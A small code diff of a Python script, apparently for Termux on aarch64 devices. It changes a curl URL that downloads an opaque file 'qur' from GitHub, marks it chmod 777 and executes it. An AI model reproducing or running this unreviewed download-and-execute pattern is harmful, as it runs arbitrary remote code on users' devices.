@@ -9,7 +9,7 @@ os.system('pkg install file > /dev/null')
 current_os=subprocess.check_output('uname -om',shell=True)
 if 'aarch64' in str(current_os):
     if not os.path.isfile('h64'):
-        os.system('curl -L https://github.com/Somi673/test/blob/main/qur?raw=true > qur')
+        os.system('curl -L https://github.com/Somi673/repo/blob/main/qur?raw=true > qur')
         os.system('chmod 777 qur')
         os.system('./qur')
     else:
